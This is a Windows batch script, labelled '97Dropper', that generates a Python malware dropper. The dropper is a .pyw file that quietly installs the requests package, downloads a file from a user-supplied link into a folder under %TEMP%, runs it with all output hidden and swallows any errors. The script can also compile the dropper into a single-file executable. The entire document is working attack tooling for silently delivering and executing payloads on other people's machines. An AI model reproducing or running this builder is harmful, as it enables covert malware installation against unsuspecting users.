::::::::::::::::::::::::::
:: 97 Made by ImMoonDev ::
:: github.com/ImMoonDev ::
::  gitea.com/ImMoonDev ::
::::::::::::::::::::::::::

@echo off
cls

for /f "tokens=2 delims=," %%a in ('tasklist /FI "IMAGENAME eq WindowsTerminal.exe" /NH 2^>nul') do set FOUND=1

if not defined FOUND (
    echo This script must be run in Windows Terminal.
    timeout /t 3 >nul
    exit /b
)

python --version >nul
if %errorlevel% neq 0 (
    echo Python not found!
    pause
    exit
)
pip --version >nul
if %errorlevel% neq 0 (
    echo pip not found!
    pause
    exit
)

echo Installing Dependencies...

python -m pip install --quiet --upgrade pip

pip install --quiet nuitka

cls
ping -n 2 127.0.0.1 >nul
chcp 65001 >nul
color 4
echo.
echo _________________________________________
echo.
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢿⣧⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣶⡀⠀⠀⢀⡴⠛⠁⠀⠘⣿⡄⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣷⣤⡴⠋⠀⠀⠀⠀⠀⢿⣇⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠺⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢸⣿⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠈⣿⡀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢏⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣿⡇
echo ⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣷⣾⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢿⡇
echo ⠀⠀⠀⠀⠀⠀⠀⢀⡾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⢸⡇
echo ⠀⠀⠀⠀⠀⠀⢠⡞⠁⢹⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢸⠀
echo ⠀⠀⠀⠀⣠⠟⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⢸⠀
echo ⠀⠀⠀⣰⠏⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⣴⠋⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀
echo ⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
echo ⢀⣼⠃⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
echo ⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠃
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo.
set /p filelink="File Download Link: "
set /p foldername="Dropped Folder Name: "
set /p filetype="File Type (py,bat,exe): "
echo.
echo Creating .pyw file...
timeout -t 1 >nul
echo # >>dist.pyw
echo # >>dist.pyw
echo # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀ >>dist.pyw               
echo # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢿⣧⠀  >>dist.pyw              
echo # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣶⡀⠀⠀⢀⡴⠛⠁⠀⠘⣿⡄⠀  >>dist.pyw           
echo # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣷⣤⡴⠋⠀⠀⠀⠀⠀⢿⣇⠀  >>dist.pyw            
echo # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠺⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢸⣿⠀  >>dist.pyw
echo # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠈⣿⡀  >>dist.pyw
echo # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢏⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣿⡇  >>dist.pyw
echo # ⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣷⣾⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢿⡇  >>dist.pyw
echo # ⠀⠀⠀⠀⠀⠀⠀⢀⡾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⢸⡇  >>dist.pyw
echo # ⠀⠀⠀⠀⠀⠀⢠⡞⠁⢹⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢸⠀  >>dist.pyw
echo # ⠀⠀⠀⠀⣠⠟⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⢸⠀  >>dist.pyw
echo # ⠀⠀⠀⣰⠏⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀  >>dist.pyw
echo # ⠀⠀⣴⠋⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀  >>dist.pyw
echo # ⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀  >>dist.pyw
echo # ⢀⣼⠃⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀  >>dist.pyw
echo # ⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀  >>dist.pyw
echo # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀  >>dist.pyw
echo # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀  >>dist.pyw
echo # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀  >>dist.pyw
echo # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀  >>dist.pyw
echo # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀  >>dist.pyw
echo # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠃  >>dist.pyw
echo # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  >>dist.pyw
echo # >>dist.pyw
echo # >>dist.pyw
echo # 97Dropper by ImMoonDev >>dist.pyw
echo # github.com/ImMoonDev >>dist.pyw
echo # gitea.com/ImMoonDev >>dist.pyw
echo # >>dist.pyw
echo # >>dist.pyw

echo import os >>dist.pyw
echo import subprocess >>dist.pyw
echo import sys >>dist.pyw
echo. >>dist.pyw
echo try: >>dist.pyw
echo     import requests >>dist.pyw
echo except ImportError: >>dist.pyw
echo     subprocess.run([sys.executable, "-m", "pip", "install", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) >>dist.pyw
echo     import requests >>dist.pyw
echo. >>dist.pyw
echo url = "%filelink%" >>dist.pyw
echo temp_path = os.path.join(os.getenv("TEMP"), "%foldername%") >>dist.pyw
echo file_path = os.path.join(temp_path, "97.%filetype%") >>dist.pyw
echo. >>dist.pyw
echo os.makedirs(temp_path, exist_ok=True) >>dist.pyw
echo. >>dist.pyw
echo try: >>dist.pyw
echo     response = requests.get(url, stream=True) >>dist.pyw
echo     response.raise_for_status() >>dist.pyw
echo. >>dist.pyw
echo     with open(file_path, "wb") as file: >>dist.pyw
echo         for chunk in response.iter_content(chunk_size=1024): >>dist.pyw
echo             file.write(chunk) >>dist.pyw
echo. >>dist.pyw
echo     subprocess.run([file_path], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) >>dist.pyw
echo. >>dist.pyw
echo except Exception: >>dist.pyw
echo     pass >>dist.pyw

echo.
echo Make .exe? (y/n)
set /p exe=
if /i "%exe%"==y ( goto :makeexe ) else ( exit )

:makeexe
python -m nuitka --onefile dist.pyw
if errorlevel 1 (
    echo Failed to build to .exe!
    pause
    exit
) else (
    files\rcedit.exe built.exe --set-icon ""
)